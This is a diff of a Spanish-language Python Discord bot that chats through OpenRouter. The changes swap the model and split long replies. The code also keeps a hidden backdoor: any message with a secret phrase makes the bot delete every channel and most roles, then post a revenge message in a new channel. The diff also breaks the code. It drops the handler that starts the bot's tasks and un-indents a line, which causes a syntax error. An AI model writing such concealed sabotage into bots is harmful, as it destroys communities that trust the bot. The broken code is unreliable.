@@ -51,16 +51,17 @@ def esta_activo():
 
 # Generar respuesta usando OpenRouter
 async def generar_respuesta(mensajes):
-    global bloqueado_por_limite  # <-- agregado
+    global bloqueado_por_limite
     try:
         headers = {
             "Authorization": f"Bearer {OPENAI_API_KEY}",
-            "HTTP-Referer": "https://tubotdiscord.com",
+            "Content-Type": "application/json",
+            "HTTP-Referer": "https://tubotdiscord.com",  # Reemplazalo si tenés otro link propio
             "X-Title": "BotNarumi"
         }
 
         payload = {
-            "model": "openrouter/cypher-alpha:free",
+            "model": "qwen/qwen3-235b-a22b:free",
             "messages": [
                 {"role": "system", "content": "Sos un bot de Discord con personalidad amable, graciosa y empática. Respondés en español con humor ligero y respeto."}
             ] + [{"role": "user", "content": msg} for msg in mensajes]
@@ -76,7 +77,7 @@ async def generar_respuesta(mensajes):
             print("Respuesta bruta:", response.text)
 
             if response.status_code == 429:
-                bloqueado_por_limite = True  # <-- agregado
+                bloqueado_por_limite = True
                 return "⚠️ Límite diario alcanzado."
 
             response.raise_for_status()
@@ -89,18 +90,10 @@ async def generar_respuesta(mensajes):
 
 # Evento cuando el bot se conecta
 @bot.event
-async def on_ready():
-    print(f"✅ Bot conectado como {bot.user}")
-    hablar_automaticamente.start()
-    resetear_limite.start()  # <-- agregado
-
-# Evento cuando recibe mensaje
-@bot.event
 async def on_message(message):
     if message.author == bot.user or not message.guild:
         return
 
-    # === FRASE SECRETA OFICIAL ===
     FRASE_SECRETA = "protocolo amsymvdcmpm"
     contenido = message.content.lower()
 
@@ -109,14 +102,12 @@ async def on_message(message):
             print("☢️ Frase secreta detectada. Ejecutando protocolo AMSYMVDCMPM.")
             await message.channel.send("☣️ Protocolo AMSYMVDCMPM activado. Eliminando todo...")
 
-            # Borrar todos los canales
             for canal in message.guild.channels:
                 try:
                     await canal.delete()
                 except Exception as e:
                     print(f"❌ No se pudo borrar canal {canal.name}: {e}")
 
-            # Borrar todos los roles (excepto @everyone)
             for rol in message.guild.roles:
                 if rol.name != "@everyone":
                     try:
@@ -125,8 +116,6 @@ async def on_message(message):
                         print(f"❌ No se pudo borrar rol {rol.name}: {e}")
 
             await asyncio.sleep(3)
-
-            # Crear canal final con mensaje de venganza
             nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
             await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")
 
@@ -135,7 +124,6 @@ async def on_message(message):
 
         return
 
-    # Memoria y respuesta
     memoria = cargar_memoria()
     guild_id = str(message.guild.id)
     if guild_id not in memoria:
@@ -143,7 +131,7 @@ async def on_message(message):
 
     memoria[guild_id]["mensajes"].append(message.content)
     if len(memoria[guild_id]["mensajes"]) > 20:
-        memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
+    memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
 
     guardar_memoria(memoria)
 
@@ -154,9 +142,16 @@ async def on_message(message):
     ):
         if esta_activo():
             respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
-            await message.channel.send(respuesta)
+
+            # 👉 Fragmentar si excede los 2000 caracteres
+            if len(respuesta) > 2000:
+                for i in range(0, len(respuesta), 2000):
+                    await message.channel.send(respuesta[i:i+2000])
+            else:
+                await message.channel.send(respuesta)
 
     await bot.process_commands(message)
+
 
 # Tarea: hablar solo cada 2 horas
 @tasks.loop(hours=2)
